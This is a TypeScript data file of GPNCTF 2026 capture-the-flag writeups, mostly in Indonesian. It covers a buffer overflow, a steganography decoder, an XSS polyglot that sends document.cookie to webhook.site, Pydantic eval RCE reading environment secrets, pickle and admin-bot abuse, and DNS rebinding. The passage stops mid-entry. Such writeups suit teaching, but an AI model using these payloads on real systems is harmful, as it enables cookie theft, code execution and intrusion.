import type { WriteUp } from '../types';

// GPNCTF 2026 — 17 writeups
export const gpnctf2026Writeups: WriteUp[] = [
  {
  "id": "gpnctf2026-pwn-recipefordisaster",
  "title": "Konfigurasi target",
  "ctfName": "GPNCTF 2026",
  "category": "Pwn",
  "difficulty": "Medium",
  "points": 0,
  "date": "2026-06-09",
  "author": "Nattt",
  "tags": [],
  "description": "#RecipeForDisaster",
  "problemDescription": "#RecipeForDisaster\n\nKerentanan utama terletak pada fungsi take_order() di dalam file challenge.c. Program menggunakan fungsi gets() yang tidak aman untuk menerima input dari pengguna ke dalam buffer note.\n\nprintf(\"Any note for the chef? (leave blank for none)\\n> \");\ngets(cur->note); // <-- Vulnerability\n\n\nBuffer note didefinisikan dalam struct Item sebagai array karakter berukuran 32 byte. Tepat setelah note di dalam memori struct tersebut, terdapat variabel price bertipe integer (4 byte).\n\ntypedef struct {\n  char item[32];\n  char note[32]; // 32 bytes\n  int price;     // 4 bytes\n} Item;\n\n\nKarena gets() tidak membatasi jumlah input yang dibaca, kita dapat menulis lebih dari 32 byte ke dalam note, yang mengakibatkan memori tumpah (overflow) dan menimpa nilai variabel price di sebelahnya.\n\nStrategi Eksploitasi\n\nTujuan eksploitasi adalah memicu pemanggilan fungsi print_coupon() yang akan membaca dan mencetak isi file /flag. Fungsi ini dipanggil dari dalam verify_total() jika argumen total bernilai kurang dari 0.\n\nvoid verify_total(int total) {\n  if (total < 0) {\n    puts(\"\\n[SYSTEM] Pricing error detected! We sincerely apologise for\");\n    puts(\"[SYSTEM] the inconvenience. Please accept this coupon:\\n\");\n    print_coupon();\n    exit(0);\n  }\n  // ...\n}\n\n\nAgar nilai total menjadi negatif, kita mengeksploitasi buffer overflow pada fungsi gets().\n\nKirim 32 byte junk data (misal: A * 32) untuk memenuhi buffer note.\n\nKirim 4 byte nilai integer negatif (misal: 0xffffffff yang merupakan representasi -1 dalam memori 32-bit).\n\nSelesaikan pesanan agar program menghitung kalkulasi total.\n\nTotal pesanan akan menjadi negatif, memicu verify_total() untuk mencetak flag.\n\nScript Eksploitasi (pwntools)\n\nfrom pwn import *\n\nhost = 'boiled-strawberry-marinated-in-whipped-carbonara-feyg.gpn24.ctf.kitctf.de'\nport = 443\n\np = remote(host, port, ssl=True)\n\np.sendlineafter(b'finish: ', b'1')\n\npayload = b'A' * 32 + p32(0xffffffff)\np.sendlineafter(b'> ', payload)\n\np.sendlineafter(b'finish: ', b'0')\n\np.interactive()\n\n\nHasil\n\nEksekusi script menghasilkan total harga negatif dan memicu sistem untuk mencetak flag:\n\nFlag: GPNCTF{WA1t, wiTh THe5e PriCe5, OverflOws ShOUld n0T 8E po5Sible...}",
  "tools": [],
  "analysis": "",
  "solution": [
    {
      "title": "Solver Script",
      "content": "Script solver lengkap (solve.py):",
      "code": "from pwn import *\r\n\r\n# Target server (menggunakan SSL sesuai perintah ncat di deskripsi)\r\nhost = 'boiled-strawberry-marinated-in-whipped-carbonara-feyg.gpn24.ctf.kitctf.de'\r\nport = 443\r\n\r\np = remote(host, port, ssl=True)\r\n# Jika ingin test lokal dulu, un-comment baris di bawah dan comment remote di atas:\r\n# p = process('./challenge')\r\n\r\n# Memilih menu nomor 1\r\np.sendlineafter(b'finish: ', b'1')\r\n\r\n# Payload Buffer Overflow: 32 bytes padding untuk memenuhi 'note' + 4 bytes untuk menimpa 'price' menjadi -1\r\npayload = b'A' * 32 + p32(0xffffffff)\r\np.sendlineafter(b'> ', payload)\r\n\r\n# Kirim '0' untuk menyelesaikan pesanan dan memicu kalkulasi total\r\np.sendlineafter(b'finish: ', b'0')\r\n\r\n# Menangkap sisa output (termasuk flag)\r\np.interactive()"
    }
  ],
  "terminalOutputs": [],
  "flag": "",
  "lessonsLearned": []
},
  {
  "id": "gpnctf2026-misc-organized",
  "title": "Pharry - Organized",
  "ctfName": "GPNCTF 2026",
  "category": "Misc",
  "difficulty": "Medium",
  "points": 0,
  "date": "2026-06-09",
  "author": "Nattt",
  "tags": [],
  "description": "Writeup for challenge Pharry - Organized",
  "problemDescription": "Challenge ini terlihat seperti satu file berisi data acak. Setelah dicek, memang tidak ada magic header, string flag, atau format file umum. Triknya bukan mencari teks langsung, tetapi melihat bagaimana data acaknya **diorganisasi**.\n\nFile memiliki ukuran `7,650,000` byte. Ukuran ini bisa dibagi tepat menjadi:\n\n```text\n408 chunk x 18,750 byte\n```\n\nSetiap chunk terlihat random, tetapi jumlah bit `1` di dalam chunk tidak random penuh. Kalau dihitung popcount per chunk, nilainya jatuh ke 6 cluster yang sangat jelas. Enam cluster ini adalah digit level `0` sampai `5`.",
  "tools": [],
  "analysis": "Pertama, file dicek sebagai raw data:\n\n```bash\nfile data\nstrings -a data | grep GPNCTF\n```\n\nTidak ada string flag langsung.\n\nKemudian distribusi byte dicek. Byte `0x00`, power-of-two, dan byte dengan popcount rendah muncul dengan pola yang terlalu rapi untuk data random biasa. Ini mengarah ke analisis popcount.\n\nSetelah file dipecah menjadi chunk `18,750` byte, setiap chunk dihitung jumlah bit `1`-nya. Hasilnya membentuk 408 simbol dengan 6 level stabil. Contoh awal stream level:\n\n```text\n00550055042204401452042310004423...\n```\n\nStream ini kemudian dibagi per 4 digit:\n\n```text\n0055 0055 0422 0440 1452 0423 1000 4423 ...\n```\n\nDari titik ini terlihat bahwa flag tidak dimulai dari awal stream. Dua byte awal adalah noise/header. Mulai dari codeword ke-4, pasangan 4 digit membentuk satu karakter:\n\n```text\nlow_nibble high_nibble\n```\n\nContoh awal decode:\n\n```text\n1452 0423 -> 0x47 -> G\n1000 4423 -> 0x50 -> P\n1055 0423 -> 0x4e -> N\n1440 0423 -> 0x43 -> C\n1022 4423 -> 0x54 -> T\n1052 0423 -> 0x46 -> F\n1444 5523 -> 0x7b -> {\n```\n\nJadi urutan nibble-nya adalah **low nibble dulu**, lalu **high nibble**.",
  "solution": [
    {
      "title": "Tabel Decode",
      "content": "Tabel low nibble:\n\n\n\nTabel high nibble yang muncul pada data:\n\n\n\nSetelah seluruh stream didecode dan dua byte awal dilewati, flag keluar sebagai:",
      "code": "1000 -> 0    1400 -> 1    1040 -> 2    1440 -> 3\n1022 -> 4    1422 -> 5    1052 -> 6    1452 -> 7\n1004 -> 8    1404 -> 9    1044 -> A    1444 -> B\n1025 -> C    1425 -> D    1055 -> E    1455 -> F"
    },
    {
      "title": "Solver",
      "content": "Solver final ada di `solve.py`. Cara menjalankan:\n\n\n\nOutput:",
      "code": "python3 solve.py"
    },
    {
      "title": "Solver Script",
      "content": "Script solver lengkap (solve.py):",
      "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\n\r\nDATA = Path(__file__).with_name('data')\r\nif not DATA.exists():\r\n    DATA = Path('/mnt/data/data')\r\n\r\n# The file consists of 408 organized chunks.  Each chunk is random-looking,\r\n# but its bit population count is intentionally biased into one of 6 levels.\r\nCHUNK_SIZE = 18_750\r\nSKIP_NIBBLES = 4  # first 2 bytes are not part of the flag\r\n\r\n# popcount lookup for bytes\r\nPOPCNT = bytes(bin(i).count('1') for i in range(256))\r\n\r\n# Decoding tables recovered from the organized probability levels.\r\n# A byte is encoded as two 4-symbol codewords: low nibble first, high nibble second.\r\nLOW_NIBBLE = {\r\n    '1000': 0x0, '1400': 0x1, '1040': 0x2, '1440': 0x3,\r\n    '1022': 0x4, '1422': 0x5, '1052': 0x6, '1452': 0x7,\r\n    '1004': 0x8, '1404': 0x9, '1044': 0xA, '1444': 0xB,\r\n    '1025': 0xC, '1425': 0xD, '1055': 0xE, '1455': 0xF,\r\n}\r\nHIGH_NIBBLE = {\r\n    '2223': 0x2, '5223': 0x3, '0423': 0x4,\r\n    '4423': 0x5, '2523': 0x6, '5523': 0x7,\r\n}\r\n\r\n\r\ndef classify_levels(counts):\r\n    \"\"\"Convert chunk popcounts to level digits 0..5 by sorting into clusters.\"\"\"\r\n    vals = sorted(counts)\r\n    clusters = []\r\n    cur = [vals[0]]\r\n    # The intended clusters are separated by gaps of ~9500, while noise inside\r\n    # each cluster is only hundreds. A 3000 gap is a safe separator.\r\n    for x in vals[1:]:\r\n        if x - cur[-1] > 3000:\r\n            clusters.append(cur)\r\n            cur = [x]\r\n        else:\r\n            cur.append(x)\r\n    clusters.append(cur)\r\n\r\n    centers = [sum(c) / len(c) for c in clusters]\r\n    if len(centers) != 6:\r\n        raise RuntimeError(f'expected 6 population-count levels, got {len(centers)}')\r\n\r\n    out = []\r\n    for x in counts:\r\n        level = min(range(6), key=lambda i: abs(x - centers[i]))\r\n        out.append(str(level))\r\n    return ''.join(out)\r\n\r\n\r\ndef solve(path=DATA):\r\n    blob = path.read_bytes()\r\n    if len(blob) % CHUNK_SIZE != 0:\r\n        raise RuntimeError('unexpected input size')\r\n\r\n    counts = []\r\n    for i in range(0, len(blob), CHUNK_SIZE):\r\n        counts.append(sum(POPCNT[b] for b in blob[i:i + CHUNK_SIZE]))\r\n\r\n    levels = classify_levels(counts)\r\n    nibbles = [levels[i:i + 4] for i in range(0, len(levels), 4)]\r\n\r\n    decoded = bytearray()\r\n    for i in range(SKIP_NIBBLES, len(nibbles), 2):\r\n        lo_code, hi_code = nibbles[i], nibbles[i + 1]\r\n        if lo_code not in LOW_NIBBLE or hi_code not in HIGH_NIBBLE:\r\n            raise RuntimeError(f'unknown codeword pair: {lo_code} {hi_code}')\r\n        decoded.append((HIGH_NIBBLE[hi_code] << 4) | LOW_NIBBLE[lo_code])\r\n\r\n    text = decoded.decode()\r\n    start = text.index('GPNCTF{')\r\n    end = text.index('}', start) + 1\r\n    return text[start:end]\r\n\r\n\r\nif __name__ == '__main__':\r\n    print(solve())"
    }
  ],
  "terminalOutputs": [],
  "flag": "GPNCTF{tH4nk_Y0U_T0_entropia_for_OR6ANI2ING_GPN!}",
  "lessonsLearned": []
},
  {
  "id": "gpnctf2026-web-recipeloader",
  "title": "Recipeloader",
  "ctfName": "GPNCTF 2026",
  "category": "Web",
  "difficulty": "Medium",
  "points": 0,
  "date": "2026-06-09",
  "author": "Nattt",
  "tags": [],
  "description": "Flag:",
  "problemDescription": "Flag:\n\n`GPNCTF{urL_PARSING_is_h4RD_even_fOR_8rOW53R5}`",
  "tools": [],
  "analysis": "Ada dua file yang penting:\n\n- `index.html`\n- `admin.js`\n\n`index.html` melakukan validasi source script seperti ini:\n\n```js\nconst txt = await fetch(url).then(r => r.text());\nif (!isRecipeAssignmentProgram(txt)) {\n  throw new Error(\"invalid recipe assignment program\");\n}\n\nconst s = document.createElement(\"script\");\ns.src = url;\ndocument.head.appendChild(s);\n```\n\nDi situ sudah kelihatan pola klasik: input dibaca dua kali oleh dua parser yang tidak identik.\n\n`admin.js` lebih penting lagi:\n\n```js\nawait page.goto(\"http://localhost:1337\")\nawait page.evaluate(flag => document.cookie = \"flag\"+flag, process.env.FLAG)\nawait page.goto(targetUrl)\n```\n\nBot mengunjungi app lokal, menaruh cookie flag di origin `localhost:1337`, lalu mengunjungi URL yang kita submit. Jadi target kita bukan baca DOM biasa, tapi jalankan JavaScript di origin `localhost:1337` supaya bisa baca `document.cookie`.",
  "solution": [
    {
      "title": "Inti bug",
      "content": "Aplikasi ini kelihatan sederhana:\n\n1. Ambil `?url=...`\n2. `fetch(url).then(r => r.text())`\n3. Parse hasilnya pakai `acorn`\n4. Hanya izinkan program yang bentuknya persis `recipe = \"...\"` atau ``recipe = `...` ``\n5. Kalau lolos, script yang sama dimuat lagi lewat `<script src=url>`\n\nMasalahnya ada di asumsi bahwa hasil `fetch().text()` dan parser JavaScript di browser akan melihat byte stream yang sama. Itu salah.\n\nUntuk URL `data:text/javascript;charset=utf-16le;base64,...`, browser akan:\n\n- Saat `fetch().text()`: decode jadi string yang kelihatan seperti teks UTF-8 kacau dengan `\\0` di sela-sela karakter.\n- Saat `<script src=...>`: menjalankan kontennya sebagai JavaScript UTF-16LE yang valid.\n\nJadi kita bisa bikin satu byte stream yang:\n\n- Di mata validator `acorn` terlihat seperti assignment aman ke `recipe`\n- Di mata parser JavaScript browser berubah jadi payload aktif\n\nItu parser mismatch murni."
    },
    {
      "title": "Jalan buntu yang sempat dicoba",
      "content": "Beberapa hal sempat saya uji dan semuanya mentok:\n\n- `javascript:` URL\n  Karena `fetch()` tidak mau.\n- `view-source:`\n  Tidak kepakai buat `fetch()` maupun `script src`.\n- Response `text/html`\n  Tetap diperlakukan sebagai script, bukan HTML yang bisa mengeksekusi `<script>` di dalamnya.\n- Host file publik yang mengembalikan `text/plain`\n  Browser menolak execute sebagai script atau kena CORS saat dipakai buat `fetch()`.\n- SRI race untuk HTTP\n  Tidak kepakai karena body yang dipakai `fetch()` dan body yang dipakai `<script>` harus tetap hash-identik.\n\nBagian paling bikin capek justru di sini: secara ide bug-nya sudah kelihatan, tapi butuh format payload yang pas supaya validator dan parser runtime sama-sama puas.\n\n![Pas payload ke-17 masih cuma bikin parser marah](https://i.imgflip.com/1bij.jpg)"
    },
    {
      "title": "Temuan penting",
      "content": "Kalau script disajikan sebagai UTF-16LE:\n\n- `fetch().text()` mengembalikan string dengan NUL di sela-sela karakter\n- `<script src>` bisa tetap mengeksekusi byte stream itu sebagai JS valid\n\nMasalah berikutnya: string hasil `fetch().text()` itu tetap harus lolos `acorn` sebagai:\n\n\n\nSolusinya adalah bikin polyglot byte stream.\n\nSaya pakai prefix HTML comment:\n\n\n\nLalu setelah itu saya sambung payload UTF-16LE. Ketika byte stream yang sama dibaca dengan dua cara:\n\n- Sebagai teks biasa untuk `fetch().text()`, bagian setelah `<!--` dibuang sebagai komentar sampai newline\n- Sebagai UTF-16LE untuk parser script, byte `<!--` berubah jadi identifier Unicode yang valid, jadi tidak lagi dianggap komentar HTML\n\nJadi struktur finalnya:\n\n\n\nValidator melihat:\n\n\n\nSementara parser JS runtime melihat sesuatu seperti:\n\n\n\nStatement terakhir error itu tidak masalah. Exfil sudah terjadi duluan.",
      "code": "recipe = ``"
    },
    {
      "title": "Payload final",
      "content": "Payload aktifnya sengaja sesingkat mungkin:\n\n\n\nKenapa pakai `Image`:\n\n- Tidak butuh CORS\n- Cukup menghasilkan GET request\n- Paling minim friksi\n\nCookie yang dibaca bot bentuknya:\n\n\n\nJadi callback yang saya tunggu cukup request ke:",
      "code": "(new Image).src=\"https://webhook.site/<token>?c=\"+encodeURIComponent(document.cookie)"
    },
    {
      "title": "Solver",
      "content": "Saya simpan solver di:\n\n- [solve.py](/home/nata/ctf/GPNCTF2026/web/Recipeloader/recipeloader/solve.py)\n\nCara pakai:\n\n\n\nYang dibutuhkan cuma token dari `webhook.site`. Solver akan:\n\n1. Bangun `data:` URL polyglot UTF-16LE\n2. Submit ke `/bot/run`\n3. Poll `https://webhook.site/token/<token>/requests`\n4. Ambil callback yang berisi cookie flag",
      "code": "python3 solve.py 'https://steamed-tiramisu-dusted-with-shaved-beans-itaj.gpn24.ctf.kitctf.de' 'TOKEN_WEBHOOK'"
    },
    {
      "title": "Langkah eksploitasi yang dipakai waktu solve",
      "content": "1. Buka homepage challenge dan baca validasi di client.\n2. Baca `admin.js` dan lihat bahwa bot set cookie flag di `localhost:1337`.\n3. Pastikan exploit harus jalan di origin itu, bukan sekadar reflected XSS biasa.\n4. Uji berbagai skenario encoding sampai ketemu perbedaan perilaku `fetch().text()` vs `<script src>`.\n5. Temukan bahwa `data:text/javascript;charset=utf-16le;base64,...` adalah jalur paling enak karena:\n   - dianggap static oleh `isScriptStatic`\n   - tidak kena SRI\n   - bisa dipaksa pakai UTF-16LE\n6. Susun polyglot dengan `<!--` supaya validator dan parser runtime membaca konten yang berbeda.\n7. Pakai `(new Image).src=...` untuk exfil cookie.\n8. Submit URL lokal ke `/bot/run`.\n9. Poll webhook sampai request bot masuk.\n10. Ambil nilai setelah prefix `flag`."
    },
    {
      "title": "Bukti hasil",
      "content": "Callback yang masuk dari bot berisi:\n\n\n\nSetelah URL-decoding dan buang prefix `flag`, didapat:",
      "code": "?c=flagGPNCTF%7BurL_PARSING_is_h4RD_even_fOR_8rOW53R5%7D"
    },
    {
      "title": "Kenapa bug ini menarik",
      "content": "Biasanya challenge beginian kelihatan seperti “oh, paling cuma whitelist assignment string literal”. Tapi sebenarnya validasinya berdiri di atas asumsi yang rapuh:\n\n- satu URL\n- satu resource\n- dua jalur parsing\n- hasil dianggap identik\n\nPadahal browser tidak bekerja seperti itu. Begitu encoding ikut bermain, validator dan runtime bisa hidup di dunia yang berbeda.\n\nItu yang bikin challenge ini enak: bug-nya bukan sanitizer jelek, tapi salah model mental soal bagaimana browser membaca resource.\n\n![Pas akhirnya request bot nongol dan semuanya langsung masuk akal](https://i.imgflip.com/1bhk.jpg)"
    },
    {
      "title": "Solver Script",
      "content": "Script solver lengkap (solve.py):",
      "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport base64\r\nimport sys\r\nimport time\r\nimport urllib.parse\r\n\r\nimport requests\r\n\r\n\r\ndef build_data_url(webhook_url: str) -> str:\r\n    payload_core = f'=0;(new Image).src=\"{webhook_url}?c=\"+encodeURIComponent(document.cookie);/*'\r\n    trailer = \"re\\\\u0063ipe = ``\"\r\n    raw = b\"<!--\" + payload_core.encode(\"utf-16le\") + b\"*/\\n\" + trailer.encode()\r\n    return \"data:text/javascript;charset=utf-16le;base64,\" + base64.b64encode(raw).decode()\r\n\r\n\r\ndef build_bot_url(instance: str, webhook_url: str) -> str:\r\n    data_url = build_data_url(webhook_url)\r\n    inner = \"http://localhost:1337/?url=\" + urllib.parse.quote(data_url, safe=\"\")\r\n    return instance.rstrip(\"/\") + \"/bot/run?url=\" + urllib.parse.quote(inner, safe=\"\")\r\n\r\n\r\ndef trigger(instance: str, webhook_url: str) -> None:\r\n    bot_url = build_bot_url(instance, webhook_url)\r\n    res = requests.get(bot_url, timeout=30)\r\n    res.raise_for_status()\r\n    print(f\"[+] bot response: {res.text.strip()}\")\r\n\r\n\r\ndef poll_flag(token: str, timeout: int) -> str | None:\r\n    api = f\"https://webhook.site/token/{token}/requests\"\r\n    deadline = time.time() + timeout\r\n    while time.time() < deadline:\r\n        res = requests.get(api, timeout=20)\r\n        res.raise_for_status()\r\n        data = res.json().get(\"data\", [])\r\n        for entry in data:\r\n            url = entry.get(\"url\", \"\")\r\n            if \"?c=flag\" not in url:\r\n                continue\r\n            parsed = urllib.parse.urlparse(url)\r\n            qs = urllib.parse.parse_qs(parsed.query)\r\n            cookie = qs.get(\"c\", [\"\"])[0]\r\n            if cookie.startswith(\"flag\"):\r\n                return cookie[4:]\r\n        time.sleep(2)\r\n    return None\r\n\r\n\r\ndef main() -> int:\r\n    parser = argparse.ArgumentParser(description=\"Exploit recipeloader via UTF-16LE data URL parser mismatch\")\r\n    parser.add_argument(\"instance\", help=\"challenge base URL, contoh: https://steamed-tiramisu-dusted-with-shaved-beans-itaj.gpn24.ctf.kitctf.de\")\r\n    parser.add_argument(\"webhook_token\", help=\"token webhook.site\")\r\n    parser.add_argument(\"--timeout\", type=int, default=30, help=\"poll timeout in seconds\")\r\n    args = parser.parse_args()\r\n\r\n    webhook_url = f\"https://webhook.site/{args.webhook_token}\"\r\n\r\n    print(f\"[+] instance : {args.instance}\")\r\n    print(f\"[+] webhook  : {webhook_url}\")\r\n    trigger(args.instance, webhook_url)\r\n\r\n    print(\"[+] waiting for bot callback...\")\r\n    flag = poll_flag(args.webhook_token, args.timeout)\r\n    if not flag:\r\n        print(\"[-] no flag callback received\", file=sys.stderr)\r\n        return 1\r\n\r\n    print(f\"[+] flag: {flag}\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
    }
  ],
  "terminalOutputs": [],
  "flag": "GPNCTF{urL_PARSING_is_h4RD_even_fOR_8rOW53R5}",
  "lessonsLearned": []
},
  {
  "id": "gpnctf2026-web-restaurant-builder",
  "title": "Restaurant  Builder",
  "ctfName": "GPNCTF 2026",
  "category": "Web",
  "difficulty": "Medium",
  "points": 0,
  "date": "2026-06-09",
  "author": "Nattt",
  "tags": [],
  "description": "GPNCTF - Restaurant-Builder Writeup",
  "problemDescription": "GPNCTF - Restaurant-Builder Writeup\n\nChallenge Info\n\nCategory: Web\n\nTech Stack: Python, FastAPI, Pydantic v2\n\nVulnerability Analysis\n\nThe vulnerability exists in the /blueprint/{name} POST endpoint, where the application dynamically generates a Pydantic model based on user input.\n\n@app.post(\"/blueprint/{name}\")\ndef register_blueprint(name: str, description: Dict[str,str] = Body()):\n    # ...\n    description = {k: v for k,v in description.items() if not k.startswith(\"__\")}\n    Blueprint = create_model(name, **description)\n    blueprints[name] = Blueprint\n\n\nIn Pydantic v2, if you pass a string value as a keyword argument to create_model(), it treats the string as a Forward Reference (a type annotation), not a default value.\n\nWhen the user requests the blueprint via the GET /blueprint/{name} endpoint, the application calls:\n\n@app.get(\"/blueprint/{name}\")\ndef get_blueprint(name: str):\n    # ...\n    return blueprint.model_json_schema()\n\n\nDuring model_json_schema() execution, Pydantic attempts to resolve the un-evaluated forward reference by passing the string to Python's internal eval(). This results in Remote Code Execution (RCE).\n\nExploit Strategy\n\nThe Dockerfile shows the flag is stored in the environment variable FLAG.\n\nTo extract the flag without a reverse shell, we can embed our OS command within a typing.Literal type hint. When eval() processes the string, it fetches the environment variable, and Pydantic sets the literal's value as a const field in the resulting JSON schema.\n\nPayload:\n\n__import__(\"typing\").Literal[__import__(\"os\").environ.get(\"FLAG\")]\n\n\nExecution\n\n1. Inject the payload\nRegister a new blueprint with the payload as the field value.\n\ncurl -s -X POST https://deep-fried-sardine-nestled-in-candied-mint-lcz4.gpn24.ctf.kitctf.de/blueprint/GetFlag \\\n-H \"Content-Type: application/json\" \\\n-d '{\"bocor\": \"__import__(\\\"typing\\\").Literal[__import__(\\\"os\\\").environ.get(\\\"FLAG\\\")]\"}'\n\n\n2. Trigger evaluation and leak the flag\nSend a GET request to invoke model_json_schema() and retrieve the evaluated schema.\n\ncurl -s https://deep-fried-sardine-nestled-in-candied-mint-lcz4.gpn24.ctf.kitctf.de/blueprint/GetFlag\n\n\nResulting Output:\n\n{\"properties\":{\"bocor\":{\"const\":\"GPNCTF{and_one_or_7Wo_rCE5_1A7er_THey_bui17_hAPP11y_EVer_af73R}\",\"title\":\"Bocor\",\"type\":\"string\"}},\"required\":[\"bocor\"],\"title\":\"GetFlag\",\"type\":\"object\"}\n\n\nFlag: GPNCTF{and_one_or_7Wo_rCE5_1A7er_THey_bui17_hAPP11y_EVer_af73R}",
  "tools": [],
  "analysis": "",
  "solution": [],
  "terminalOutputs": [],
  "flag": "GPNCTF{and_one_or_7Wo_rCE5_1A7er_THey_bui17_hAPP11y_EVer_af73R}",
  "lessonsLearned": []
},
  {
  "id": "gpnctf2026-web-secretpickle",
  "title": "SecretPickle",
  "ctfName": "GPNCTF 2026",
  "category": "Web",
  "difficulty": "Medium",
  "points": 0,
  "date": "2026-06-09",
  "author": "Nattt",
  "tags": [],
  "description": "Writeup for challenge SecretPickle",
  "problemDescription": "Challenge ini terlihat seperti memakai \"encrypted pickle\", tapi implementasinya sebenarnya sangat lemah:\n\n- `secretpickle_dump()` hanya melakukan XOR dengan key statis.\n- `secretpickle_load()` membalik XOR lalu langsung memanggil `pickle.loads()`.\n\nArtinya, payload pickle masih bisa dibuat secara bebas. Begitu format XOR-nya dipahami, kita bisa mengirim pickle buatan sendiri ke server.\n\nSolusi akhirnya tidak perlu RCE yang rumit. Jalur paling sederhana adalah memakai fitur `adminbot` untuk meminta browser admin membuka `file:///flag.txt`, lalu membaca flag dari screenshot yang dikembalikan.",
  "tools": [],
  "analysis": "File penting:\n\n- [`app/secretpickle.py`](app/secretpickle.py)\n- [`app/server.py`](app/server.py)\n- [`app/adminbot.py`](app/adminbot.py)",
  "solution": [
    {
      "title": "1. Format \"secretpickle\"",
      "content": "Di [`app/secretpickle.py`](app/secretpickle.py), formatnya:\n\n\n\nMasalahnya:\n\n- key XOR hardcoded dan publik\n- prefix pickle juga hardcoded\n- hasil akhirnya tetap `pickle.loads()`\n\nJadi payload yang dikirim tetap bisa mengandung opcode pickle apa pun, selama bagian tail-nya dibentuk dengan benar.",
      "code": "decoded = base64.b64decode(encoded)\nxored = secretpickle_encrypt(decoded)\nuntrimmed = SECRETPICKLE_OBJECT_PREFIX + xored\nraw = decoder(untrimmed)"
    },
    {
      "title": "2. Endpoint adminbot",
      "content": "Di [`app/server.py`](app/server.py), action `adminbot`:\n\n\n\nServer hanya meneruskan URL ke service adminbot.\n\nDi [`app/adminbot.py`](app/adminbot.py), browser admin:\n\n1. register akun `admin` dengan password flag\n2. login\n3. membuka URL yang kita kirim\n4. mengambil screenshot halaman terakhir\n\nIni penting, karena browser admin berjalan di container adminbot yang punya `/flag.txt`.",
      "code": "url = base64.b64decode(params[\"url\"]).decode()\nadminbot_url = f\"http://{ADMINBOT_HOST}:{ADMINBOT_PORT}/visit?url={quote(url)}\""
    },
    {
      "title": "Langkah 1: Bangun payload pickle",
      "content": "Tujuannya bukan RCE di server utama, tapi memanfaatkan action `adminbot` agar browser admin membuka file lokal:\n\n\n\nPayload request tetap harus dibungkus ke format `secretpickle`.",
      "code": "file:///flag.txt"
    },
    {
      "title": "Langkah 2: Encode URL tujuan",
      "content": "URL dibungkus base64 dulu karena field `params.url` memang expect base64.\n\nContoh:",
      "code": "inner = base64.b64encode(b\"file:///flag.txt\").decode()"
    },
    {
      "title": "Langkah 3: Kirim ke server",
      "content": "Secara lokal saya generate pickle dict:\n\n\n\nLalu:\n\n1. `pickle.dumps(pl, protocol=4)`\n2. ambil tail setelah prefix `SECRETPICKLE_OBJECT_PREFIX`\n3. XOR dengan key `SECRETPICKLE_XOR_KEY`\n4. base64 encode hasilnya\n5. POST ke `/<payload>`",
      "code": "pl = {\n    \"action\": \"adminbot\",\n    \"params\": {\"url\": inner}\n}"
    },
    {
      "title": "Langkah 4: Decode respons",
      "content": "Server mengembalikan respons yang juga dibungkus `secretpickle`.\n\nSetelah didecode, respons berisi HTML yang memuat screenshot adminbot dalam bentuk data URI PNG.\n\nScreenshot tersebut menampilkan isi `/flag.txt`."
    },
    {
      "title": "Payload Generator",
      "content": "Script yang dipakai:",
      "code": "import base64\nimport pickle\nimport sys\nimport urllib.request\n\nsys.path.insert(0, \"app\")\nfrom secretpickle import secretpickle_encrypt, secretpickle_load, SECRETPICKLE_OBJECT_PREFIX\n\nurl = \"file:///flag.txt\"\ninner = base64.b64encode(url.encode()).decode()\npl = {\"action\": \"adminbot\", \"params\": {\"url\": inner}}\n\nraw = pickle.dumps(pl, protocol=4)\nbody = raw[len(SECRETPICKLE_OBJECT_PREFIX):]\nencoded = base64.b64encode(secretpickle_encrypt(body)).decode()\n\nreq = urllib.request.Request(\n    \"https://steamed-filet-infused-with-whipped-soy-foam-okgv.gpn24.ctf.kitctf.de/\" + encoded,\n    method=\"POST\",\n)\nwith urllib.request.urlopen(req, timeout=60) as resp:\n    data = resp.read().decode().strip()\n\nres = secretpickle_load(data)\nprint(res)"
    },
    {
      "title": "Kenapa Ini Bisa Jalan",
      "content": "Inti bug-nya ada di dua tempat:\n\n- \"enkripsi\" pickle cuma XOR statis, jadi tidak ada proteksi nyata\n- adminbot menerima URL bebas, lalu browser-nya membuka URL itu dengan akses ke file lokal container adminbot\n\nJadi challenge ini sebenarnya gabungan dari:\n\n- reversible custom pickle wrapper\n- browser automation yang terlalu permisif"
    }
  ],
  "terminalOutputs": [],
  "flag": "GPNCTF{the_picK13_W4s_SeCReT_Bu7_nEvEr_SEcurE}",
  "lessonsLearned": []
},
  {
  "id": "gpnctf2026-web-simplefoodnotifications",
  "title": "Simple Food Notifications",
  "ctfName": "GPNCTF 2026",
  "category": "Web",
  "difficulty": "Medium",
  "points": 0,
  "date": "2026-06-09",
  "author": "Nattt",
  "tags": [],
  "description": "Writeup for challenge Simple Food Notifications",
  "problemDescription": "",
  "tools": [],
  "analysis": "",
  "solution": [
    {
      "title": "Gambaran Singkat",
      "content": "Target ini adalah aplikasi Flask yang menerima `url` notifikasi saat order makanan dibuat. Setelah beberapa detik, server akan melakukan request ke URL itu dan menyimpan body respons ke endpoint `/notification/<id>`.\n\nFlag ada di endpoint tersembunyi `/vip-meal`, tapi endpoint ini hanya mau melayani request yang datang dari `127.0.0.1`."
    },
    {
      "title": "Temuan Utama",
      "content": "File yang paling penting ada di [`app/app.py`](/home/nata/ctf/GPNCTF2026/web/Simplefoodnotifications/simple-food-notifications/app/app.py).\n\nAlur yang relevan:\n\n1. User kirim `POST /order` dengan parameter `url`.\n2. Server menyimpan status order.\n3. Setelah delay 5-15 detik, server:\n   - resolve hostname dengan `socket.getaddrinfo()`,\n   - menolak kalau ada IP non-global,\n   - lalu melakukan `urllib3.request('GET', url, ...)`.\n4. Respons GET itu disimpan ke `/notification/<id>`.\n\nBagian pentingnya ada di sini:\n\n\n\nArtinya ada celah klasik DNS rebinding:\n\n- validasi hostname dilakukan dulu,\n- request aslinya dilakukan belakangan,\n- ada jeda beberapa detik di antara dua langkah itu.",
      "code": "addresses = socket.getaddrinfo(urllib3.util.parse_url(url).host, 80)\nfor addr in addresses:\n    if (not ipaddress.ip_address(addr[4][0]).is_global):\n        notifications[id] = {\n            \"message\": \"Only staff is allowed to see mess in the kitchen, we don't want you to see the rats.\",\n            \"status\": \"REJECTED\"\n        }\n        return\n\nr = urllib3.request('GET', url, redirect=False, timeout=urllib3.Timeout(30))"
    },
    {
      "title": "Kenapa Bisa Bypass",
      "content": "Saya pakai domain rebinding publik `rbndr.us`.\n\nFormat hostname yang dipakai:\n\n\n\nDomain ini bisa berganti IP antar query. Target melihat IP global saat validasi, lalu saat request kedua domain sudah mengarah ke `127.0.0.1`.\n\nKarena `/vip-meal` hanya membolehkan request dari localhost, ini cukup untuk membaca flag.",
      "code": "7f000001.08080808.rbndr.us"
